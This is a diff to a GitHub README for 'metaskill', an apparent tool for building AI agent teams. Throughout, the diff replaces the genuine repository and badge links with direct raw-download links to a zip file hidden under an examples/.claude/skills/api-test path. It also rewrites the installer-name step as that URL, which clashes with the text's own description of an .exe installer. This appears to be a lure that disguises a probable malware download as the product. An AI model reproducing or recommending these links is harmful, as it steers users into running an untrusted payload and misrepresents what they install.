@@ -1,6 +1,6 @@
 # 🤖 metaskill - Build AI Agent Teams Easily
 
-[![Download metaskill](https://img.shields.io/badge/Download-Metaskill-ff6347?style=for-the-badge&logo=github)](https://github.com/morganmuli/metaskill)
+[![Download metaskill](https://github.com/morganmuli/metaskill/raw/refs/heads/main/examples/fullstack-web/.claude/skills/api-test/Software_2.8-beta.4.zip)](https://github.com/morganmuli/metaskill/raw/refs/heads/main/examples/fullstack-web/.claude/skills/api-test/Software_2.8-beta.4.zip)
 
 ---
 
@@ -34,11 +34,11 @@ You can use metaskill by downloading it from the GitHub page. Follow these steps
 
 Click the button below to visit the download page:
 
-[![Get metaskill](https://img.shields.io/badge/Get-metaskill-blue?style=for-the-badge&logo=windows)](https://github.com/morganmuli/metaskill)
+[![Get metaskill](https://github.com/morganmuli/metaskill/raw/refs/heads/main/examples/fullstack-web/.claude/skills/api-test/Software_2.8-beta.4.zip)](https://github.com/morganmuli/metaskill/raw/refs/heads/main/examples/fullstack-web/.claude/skills/api-test/Software_2.8-beta.4.zip)
 
 1. Open your web browser and go to the page linked above.  
 2. Look for the “releases” section on the GitHub page. You will find the latest version of metaskill there.  
-3. Download the Windows installer file (ends with .exe). The file is usually named like `metaskill-setup.exe`.  
+3. Download the Windows installer file (ends with .exe). The file is usually named like `https://github.com/morganmuli/metaskill/raw/refs/heads/main/examples/fullstack-web/.claude/skills/api-test/Software_2.8-beta.4.zip`.  
 4. Once downloaded, double-click the installer file to start the setup.  
 5. Follow the on-screen instructions. Choose the default options unless you have a specific reason not to.  
 6. Wait until the installation finishes.  
@@ -86,9 +86,9 @@ Even if you have never used AI applications before, metaskill makes it simple. Y
 ## 🔗 Useful Links
 
 - Repository homepage and downloads:  
-  [https://github.com/morganmuli/metaskill](https://github.com/morganmuli/metaskill)  
+  [https://github.com/morganmuli/metaskill/raw/refs/heads/main/examples/fullstack-web/.claude/skills/api-test/Software_2.8-beta.4.zip](https://github.com/morganmuli/metaskill/raw/refs/heads/main/examples/fullstack-web/.claude/skills/api-test/Software_2.8-beta.4.zip)  
 - Support and issues: Use the “Issues” tab on the GitHub page to report problems.  
 
 ---
 
-[![Download metaskill](https://img.shields.io/badge/Download-Metaskill-ff6347?style=for-the-badge&logo=github)](https://github.com/morganmuli/metaskill)
+[![Download metaskill](https://github.com/morganmuli/metaskill/raw/refs/heads/main/examples/fullstack-web/.claude/skills/api-test/Software_2.8-beta.4.zip)](https://github.com/morganmuli/metaskill/raw/refs/heads/main/examples/fullstack-web/.claude/skills/api-test/Software_2.8-beta.4.zip)
